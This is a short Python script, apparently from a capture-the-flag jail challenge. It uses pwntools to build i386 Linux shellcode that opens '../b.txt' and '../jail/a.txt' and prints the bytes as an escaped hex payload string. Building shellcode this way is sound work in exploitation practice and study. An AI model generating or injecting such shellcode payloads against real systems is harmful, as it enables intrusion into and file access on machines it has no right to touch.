from pwn import *

context.arch = 'i386'
context.os = 'linux'

sc = shellcraft.open('../b.txt')
sc += shellcraft.open('../jail/a.txt')

print(''.join('\\x{:02x}'.format(c) for c in asm(sc)))
